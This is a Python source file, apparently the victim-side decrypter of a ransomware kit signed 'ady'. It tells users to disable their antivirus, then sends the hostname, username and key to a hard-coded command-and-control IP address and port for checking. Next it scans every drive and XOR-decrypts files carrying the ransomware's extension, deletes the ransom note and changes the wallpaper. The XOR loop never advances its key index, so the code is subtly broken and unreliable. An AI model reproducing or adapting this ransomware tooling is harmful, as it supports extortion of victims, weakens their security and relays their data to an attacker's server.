import os
from threading import Thread
import queue
import socket
# import urllib.request
import sys
import ctypes
# encrypted_ext=['.txt','.pdf','.doc','.docx','.jpg','.jpeg','.mp4','mp3','.mkv','.avi','png']
encrypted_ext=['.encryptedbyady']
file_paths = []
desk_path= os.environ['USERPROFILE']+'\\Desktop'
# down_path=os.environ['USERPROFILE']+'\\Downloads'
def removespace(string):
    return string.replace(" ", "")
def resource_path(relative_path):
    # """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)
def decrypt(key):
    while True:
        file=q.get()
        print(f'Decrypting: {file} \nPlease wait!')
        try:
            key_index=0
            max_key_index=len(key)-1
            encrypted_data=''
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'wb') as f:
                for byte in data:
                    xor_byte = byte ^ ord(key[key_index])
                    f.write(xor_byte.to_bytes(1, 'little'))
                if key_index>=max_key_index:
                    key_index=0
                else:
                    key_index+=1
            base,ext = os.path.splitext(file)
            os.rename(file, base)
            # print(f'Successfully decrypted: {file}')
        except:
            # print(f'Failed to decrypt: {file}')
            pass
        q.task_done()
os.system('color 0A')
print("Welcome to Decrypter by ady!\n\nRead the below instructions with caution before proceeding:\n\n"
      ">Disable your antivirus/windows defender as it can hinder with decrypter.\n"
      ">Be ready with the key you received from ady for decryption.\n"
      ">Do ensure that you have an internet connection for key verification.\n"
      ">Decryption will begin as soon as the key is verified!\n"
      ">It may take a while, do not close this window/turn off your device when decryption is in progress.\n"
      ">In case of doubts/errors contact ady at aadityasaini30@yahoo.com\n")
while True:
    key=input("Enter the key for decryption: ")
    key=removespace(key)
    print("\nConnecting to server...")
    ip_address='34.217.2.102'
    port = 46969
    hostname=os.getenv('COMPUTERNAME')
    username=os.getenv('USERNAME')
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((ip_address,port))
            flag=1
        except:
            print("\nConnection to server failed! (Check your internet connection/contact ady, then try again!)\n")
            flag=0
        if flag==0:
            continue
        s.send(bytes(f'Decrypter: {hostname} - {username}: {key}','utf-8'))
        decision=s.recv(1024).decode('utf-8')
        if decision=="no":
            print("The key you entered didn't match any encrypted host, please try again!\n")
            continue
        elif decision=="yes":
            print("Key verification successful!\n\nStarting decryption!\n")
            if os.path.exists(desk_path+'\\'+'Read_me_encryptedbyady.txt'):
                os.remove(desk_path+'\\'+'Read_me_encryptedbyady.txt')
            # if os.path.exists(desk_path+'\\'+'View_me_encryptedbyady.jpg'):
            #     os.remove(desk_path+'\\'+'View_me_encryptedbyady.jpg')


            # def dl_img(image_url, image_path, image_name):
            #     full_path = image_path + '\\' + image_name + '.jpg'
            #     urllib.request.urlretrieve(image_url, full_path)
            #     return full_path


            # image_url = "https://i.ibb.co/djSDQ9m/7c2f345bdfcadb8a3faf483ebaa2e9aea712bbdb.jpg"
            # image_name = "Wallpaper_decryptedbyady"
            # sourc = dl_img(image_url, down_path, image_name)
            sourc = resource_path("Wallpaper_decryptedbyady.jpg")
            SPI_WALLPAPER = 0x14
            SPIF_UPDATINGFILE = 0x2
            ctypes.windll.user32.SystemParametersInfoW(SPI_WALLPAPER, 0, sourc, SPIF_UPDATINGFILE)
            break
        else:
            sys.exit()
Drives=[]
for drive_letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
        if os.path.exists(f'{drive_letter}:'):
            Drives.append(drive_letter+':\\')
        else:
            pass
for sk in Drives:
    for root, dirs, files in os.walk(sk):
        dirs[:] = [d for d in dirs if d!="Windows"]
        for file in files:
            file_path, file_ext=os.path.splitext(root+'\\'+file)
            if file_ext in encrypted_ext:
                file_paths.append(root+'\\'+file)
q=queue.Queue()
for f in file_paths:
    q.put(f)
for i in range(30):
    t=Thread(target=decrypt,args=(key,),daemon=True)
    t.start()
q.join()
print("\nDecryption completed!")
input("Press Enter to exit: ")